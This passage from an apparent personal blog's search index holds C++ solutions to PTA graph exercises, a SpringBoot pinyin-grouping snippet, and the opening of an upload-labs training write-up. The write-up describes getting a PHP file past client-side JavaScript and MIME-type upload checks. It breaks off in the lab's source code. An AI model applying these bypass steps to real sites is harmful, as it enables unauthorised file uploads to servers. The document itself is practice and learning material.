class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pta-7-21 红色警报 (25分)(并查集)</title>
      <link href="/2020/01/27/pta-7-21-%E7%BA%A2%E8%89%B2%E8%AD%A6%E6%8A%A5-25%E5%88%86-%E5%B9%B6%E6%9F%A5%E9%9B%86/"/>
      <url>/2020/01/27/pta-7-21-%E7%BA%A2%E8%89%B2%E8%AD%A6%E6%8A%A5-25%E5%88%86-%E5%B9%B6%E6%9F%A5%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>7-21 红色警报 (25分)</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>战争中保持各个城市间的连通性非常重要。本题要求你编写一个报警程序，当失去一个城市导致国家被分裂为多个无法连通的区域时，就发出红色警报。注意：若该国本来就不完全连通，是分裂的k个区域，而失去一个城市并不改变其他城市之间的连通性，则不要发出警报。</p><a id="more"></a><h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入在第一行给出两个整数N（0 &lt; N ≤ 500）和M（≤ 5000），分别为城市个数（于是默认城市从0到N-1编号）和连接两城市的通路条数。随后M行，每行给出一条通路所连接的两个城市的编号，其间以1个空格分隔。在城市信息之后给出被攻占的信息，即一个正整数K和随后的K个被攻占的城市的编号。</p><p>注意：输入保证给出的被攻占的城市编号都是合法的且无重复，但并不保证给出的通路没有重复。</p><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>对每个被攻占的城市，如果它会改变整个国家的连通性，则输出<code>Red Alert: City k is lost!</code>，其中k是该城市的编号；否则只输出City k is lost.即可。如果该国失去了最后一个城市，则增加一行输出<code>Game Over.</code>。</p><h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">5 </span><span class="number">4</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">1</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">3</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">0</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">0</span> <span class="number">4</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">City <span class="number">1</span> <span class="keyword">is</span> lost.</span><br><span class="line">City <span class="number">2</span> <span class="keyword">is</span> lost.</span><br><span class="line">Red Alert: City <span class="number">0</span> <span class="keyword">is</span> lost!</span><br><span class="line">City <span class="number">4</span> <span class="keyword">is</span> lost.</span><br><span class="line">City <span class="number">3</span> <span class="keyword">is</span> lost.</span><br><span class="line">Game Over.</span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">6000</span>];</span><br><span class="line"><span class="keyword">int</span> vis[<span class="number">10000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fun</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line">&#125;great[<span class="number">10000</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x!=f[x])&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">find</span>(f[x]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">marge</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fx=<span class="built_in">find</span>(x);</span><br><span class="line"><span class="keyword">int</span> fy=<span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(fx!=fy)&#123;</span><br><span class="line">f[fy]=fx;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6000</span>;i++)&#123;</span><br><span class="line">f[i]=i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">int</span> n,m,a,b;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;a,&amp;b);</span><br><span class="line">great[i].x=a;</span><br><span class="line">great[i].y=b;</span><br><span class="line">marge(a,b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(f[i]==i)&#123;</span><br><span class="line">num++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;t;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a);</span><br><span class="line">init();</span><br><span class="line">vis[a]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> num1=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(vis[great[i].x]!=<span class="number">1</span>&amp;&amp;vis[great[i].y]!=<span class="number">1</span>)&#123;</span><br><span class="line">marge(great[i].x,great[i].y);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(f[i]==i)&#123;</span><br><span class="line">num1++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(num1==num||num1==num+<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"City %d is lost.\n"</span>,a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Red Alert: City %d is lost!\n"</span>,a);</span><br><span class="line">&#125;</span><br><span class="line">num=num1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(t==n)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Game Over.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pta-7-4 地下迷宫探索 (30分)</title>
      <link href="/2020/01/27/pta-7-5-%E5%9F%8E%E5%B8%82%E9%97%B4%E7%B4%A7%E6%80%A5%E6%95%91%E6%8F%B4-25%E5%88%86/"/>
      <url>/2020/01/27/pta-7-5-%E5%9F%8E%E5%B8%82%E9%97%B4%E7%B4%A7%E6%80%A5%E6%95%91%E6%8F%B4-25%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p>日常刷题,希望新型肺炎传染病快点结束。</p><p><a href="https://pintia.cn/" target="_blank" rel="noopener"></a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>地道战是在抗日战争时期，在华北平原上抗日军民利用地道打击日本侵略者的作战方式。地道网是房连房、街连街、村连村的地下工事，如下图所示。</p><a id="more"></a><p><img src="/1.jpg"></p><p>我们在回顾前辈们艰苦卓绝的战争生活的同时，真心钦佩他们的聪明才智。在现在和平发展的年代，对多数人来说，探索地下通道或许只是一种娱乐或者益智的游戏。本实验案例以探索地下通道迷宫作为内容。</p><p>假设有一个地下通道迷宫，它的通道都是直的，而通道所有交叉点（包括通道的端点）上都有一盏灯和一个开关。请问你如何从某个起点开始在迷宫中点亮所有的灯并回到起点？</p><h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入第一行给出三个正整数，分别表示地下迷宫的节点数N（1&lt;N≤1000，表示通道所有交叉点和端点）、边数M（≤3000，表示通道数）和探索起始节点编号S（节点从1到N编号）。随后的M行对应M条边（通道），每行给出一对正整数，分别是该条边直接连通的两个节点的编号。</p><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>若可以点亮所有节点的灯，则输出从S开始并以S结束的包含所有节点的序列，序列中相邻的节点一定有边（通道）；否则虽然不能点亮所有节点的灯，但还是输出点亮部分灯的节点序列，最后输出0，此时表示迷宫不是连通图。</p><p>由于深度优先遍历的节点序列是不唯一的，为了使得输出具有唯一的结果，我们约定以节点小编号优先的次序访问（点灯）。在点亮所有可以点亮的灯后，以原路返回的方式回到起点。</p><h2 id="输入样例-1："><a href="#输入样例-1：" class="headerlink" title="输入样例 1："></a>输入样例 1：</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">6 </span><span class="number">8</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">4</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">5</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">6</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">4</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">6</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">5</span></span><br></pre></td></tr></table></figure><h2 id="输出样例-1："><a href="#输出样例-1：" class="headerlink" title="输出样例 1："></a>输出样例 1：</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">5</span> <span class="number">4</span> <span class="number">3</span> <span class="number">2</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="输入样例-2："><a href="#输入样例-2：" class="headerlink" title="输入样例 2："></a>输入样例 2：</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">6 </span><span class="number">6</span> <span class="number">6</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">3</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">4</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">5</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">4</span></span><br></pre></td></tr></table></figure><h2 id="输出样例-2："><a href="#输出样例-2：" class="headerlink" title="输出样例 2："></a>输出样例 2：</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">6 </span><span class="number">4</span> <span class="number">5</span> <span class="number">4</span> <span class="number">6</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="DFS代码"><a href="#DFS代码" class="headerlink" title="DFS代码"></a>DFS代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,k,a,b,sum;</span><br><span class="line"><span class="keyword">int</span> Map[<span class="number">1100</span>][<span class="number">1100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> vis[<span class="number">10000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">vis[x]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(x==k)&#123;</span><br><span class="line">sum++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(sum==<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(Map[x][i]==<span class="number">1</span>&amp;&amp;!vis[i])&#123;</span><br><span class="line">vis[i]=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d"</span>,i);</span><br><span class="line">dfs(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d"</span>,x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>,&amp;n,&amp;m,&amp;k);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;a,&amp;b);</span><br><span class="line">Map[a][b]=<span class="number">1</span>;</span><br><span class="line">Map[b][a]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">sum=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,k);</span><br><span class="line">dfs(k);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(vis[i]==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" 0"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot-中文按首字母分组分类</title>
      <link href="/2020/01/25/SpringBoot-%E4%B8%AD%E6%96%87%E6%8C%89%E9%A6%96%E5%AD%97%E6%AF%8D%E5%88%86%E7%BB%84%E5%88%86%E7%B1%BB/"/>
      <url>/2020/01/25/SpringBoot-%E4%B8%AD%E6%96%87%E6%8C%89%E9%A6%96%E5%AD%97%E6%AF%8D%E5%88%86%E7%BB%84%E5%88%86%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p><em><strong>项目需要用到名字选择，但是太多了需要按照首字母排序。</strong></em>_</p><a id="more"></a><h2 id="导入pinyin4j依赖"><a href="#导入pinyin4j依赖" class="headerlink" title="导入pinyin4j依赖"></a>导入pinyin4j依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.belerweb<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>pinyin4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="PinYinUtil拼音类实现代码"><a href="#PinYinUtil拼音类实现代码" class="headerlink" title="PinYinUtil拼音类实现代码"></a>PinYinUtil拼音类实现代码</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">package com.example.logSystem.pojo;</span><br><span class="line">import net.sourceforge.pinyin4j.PinyinHelper;</span><br><span class="line">import net.sourceforge.pinyin4j.format.HanyuPinyinCaseType;</span><br><span class="line">import net.sourceforge.pinyin4j.format.HanyuPinyinOutputFormat;</span><br><span class="line">import net.sourceforge.pinyin4j.format.HanyuPinyinToneType;</span><br><span class="line">import net.sourceforge.pinyin4j.format.<span class="keyword">exception</span>.BadHanyuPinyinOutputFormatCombination;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> PinYinUtil &#123;</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">              * 获取汉字串拼音，英文字符不变</span></span><br><span class="line"><span class="comment">              * @param chinese 汉字串</span></span><br><span class="line"><span class="comment">              * @return 汉语拼音</span></span><br><span class="line"><span class="comment">              */</span></span><br><span class="line">public String get<span class="constructor">FullSpell(String <span class="params">chinese</span>)</span>&#123;</span><br><span class="line">    StringBuffer pybf = <span class="keyword">new</span> <span class="constructor">StringBuffer()</span>;</span><br><span class="line">    <span class="built_in">char</span><span class="literal">[]</span> arr = chinese.<span class="keyword">to</span><span class="constructor">CharArray()</span>;</span><br><span class="line">    HanyuPinyinOutputFormat defaultFormat = <span class="keyword">new</span> <span class="constructor">HanyuPinyinOutputFormat()</span>;</span><br><span class="line">    defaultFormat.set<span class="constructor">CaseType(HanyuPinyinCaseType.UPPERCASE)</span>;</span><br><span class="line">    defaultFormat.set<span class="constructor">ToneType(HanyuPinyinToneType.WITHOUT_TONE)</span>;</span><br><span class="line">    for (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr<span class="literal">[<span class="identifier">i</span>]</span> &gt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                pybf.append(<span class="module-access"><span class="module"><span class="identifier">PinyinHelper</span>.</span></span><span class="keyword">to</span><span class="constructor">HanyuPinyinStringArray(<span class="params">arr</span>[<span class="params">i</span>], <span class="params">defaultFormat</span>)</span><span class="literal">[<span class="number">0</span>]</span>);</span><br><span class="line">            &#125; catch (BadHanyuPinyinOutputFormatCombination e) &#123;</span><br><span class="line">                e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            pybf.append(arr<span class="literal">[<span class="identifier">i</span>]</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return pybf.<span class="keyword">to</span><span class="constructor">String()</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="借鉴这位大佬的利用类"><a href="#借鉴这位大佬的利用类" class="headerlink" title="借鉴这位大佬的利用类"></a><a href="https://blog.csdn.net/qq_15901351/article/details/88201654" target="_blank" rel="noopener">借鉴这位大佬的利用类</a></h3><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">List&lt;User&gt; list1= userMapper.selectUser();</span><br><span class="line">        List&lt;Map&lt;<span class="keyword">String</span>,<span class="keyword">Object</span>&gt;&gt; list2=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="built_in">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">26</span>;i++)&#123;           <span class="comment">//查出来名字的长度</span></span><br><span class="line">                Map&lt;<span class="keyword">String</span>,<span class="keyword">Object</span>&gt; <span class="built_in">map</span>=<span class="keyword">new</span> <span class="keyword">HashMap</span>&lt;&gt;();</span><br><span class="line">                <span class="keyword">String</span> big = <span class="keyword">String</span>.valueOf((<span class="built_in">char</span>)(<span class="number">96</span>+i)).toUpperCase();    <span class="comment">//转大写</span></span><br><span class="line">                <span class="keyword">String</span> little = big.toLowerCase();</span><br><span class="line">                <span class="comment">//转小写</span></span><br><span class="line">                List&lt;Map&lt;<span class="keyword">String</span>,<span class="keyword">Object</span>&gt;&gt; list3=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                <span class="keyword">for</span>(<span class="built_in">int</span> j=<span class="number">0</span>;j&lt;list1.<span class="built_in">size</span>();j++)&#123;        <span class="comment">//遍历查出来的名字</span></span><br><span class="line">                    PinYinUtil pinyin = <span class="keyword">new</span> PinYinUtil();</span><br><span class="line">                    <span class="keyword">String</span> zm = pinyin.getFullSpell(list1.<span class="built_in">get</span>(j).getTeachername().substring(<span class="number">0</span>,<span class="number">1</span>)).substring(<span class="number">0</span>,<span class="number">1</span>);      <span class="comment">//截取首字母</span></span><br><span class="line">                    <span class="keyword">if</span>(big.equals(zm)||little.equals(zm))&#123; <span class="comment">//判断大小写</span></span><br><span class="line">                        Map&lt;<span class="keyword">String</span>, <span class="keyword">Object</span>&gt; map1 = <span class="keyword">new</span> <span class="keyword">HashMap</span>&lt;&gt;();</span><br><span class="line">                        map1.put(<span class="string">"text"</span>, list1.<span class="built_in">get</span>(j).getTeachername());</span><br><span class="line">                        map1.put(<span class="string">"id"</span>, sum);</span><br><span class="line">                        sum++;</span><br><span class="line">                        list3.<span class="built_in">add</span>(map1);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(list3.<span class="built_in">size</span>()!=<span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">map</span>.put(<span class="string">"text"</span>, big);           <span class="comment">//当前是哪个字母</span></span><br><span class="line">                    <span class="built_in">map</span>.put(<span class="string">"children"</span>, list3);</span><br><span class="line">                    list2.<span class="built_in">add</span>(<span class="built_in">map</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Spring-boot </category>
          
          <category> java-pinyin4j </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2020/01/12/upload-labs/"/>
      <url>/2020/01/12/upload-labs/</url>
      
        <content type="html"><![CDATA[<p>是weber勇闯20关，哈哈哈！老早就想写这个东西了，因为最喜欢遇到上传的题型，基础要求稍微低那么一点点。从开学拖到寒假，我不愧是🕊王！</p><a id="more"></a><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>第一关，本来想抓包上传的，发现代理之后还提醒我不能上传php的说明，判断是前端的！查看源码，发现是jS判断后缀。。。。<br><img src="/1.jpg"><br>覆盖原先JS里面的内容完成上传<br><img src="/2.jpg"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>第二关将后缀，改为jpg，抓包后改为php再上传，没看到我上传的upload路径，还以为我错了，看了下源码，就是通过mime来验证,没错下一题。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> 